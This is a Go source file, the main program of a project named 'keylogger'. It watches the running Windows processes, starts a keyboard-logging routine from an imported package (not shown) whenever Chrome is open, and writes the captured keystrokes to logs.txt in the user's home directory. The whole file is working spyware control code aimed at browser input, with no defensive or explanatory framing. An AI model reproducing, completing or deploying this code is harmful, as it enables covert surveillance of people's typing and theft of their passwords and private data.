package main

import (
	"fmt"
	"keylogger/pkg/keyboardlogger"
	"keylogger/pkg/winprocessutils"
	"log"
	"os"
	"time"
)

func main() {
	var loggerRunning bool = false
	var logsDirectory string = ""
	if len(os.Args) > 1 {
		logsDirectory = os.Args[1]
	} else {
		home, err := os.UserHomeDir()
		if err != nil {
			log.Fatal(err)
		}
		logsDirectory = fmt.Sprintf("%s/logs.txt", home)
	}
	_, err := os.OpenFile(logsDirectory, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		_, createErr := os.Create(logsDirectory)
		if createErr != nil {
			log.Fatal(createErr)
		}
	}

	fmt.Println(logsDirectory)

	for {
		procs, err := winprocessutils.Processes()
		if err != nil {
			log.Fatal(err)
		}
		chrome := winprocessutils.FindProcessByName(procs, "chrome.exe")
		if chrome != nil {
			if !loggerRunning {
				go keyboardlogger.StartKeyboardLogger(logsDirectory)
				loggerRunning = true
			}
		} else {
			if loggerRunning {
				go keyboardlogger.StopKeyboardLogger()
				loggerRunning = false

			}
		}
		time.Sleep(5 * time.Second)
	}

}
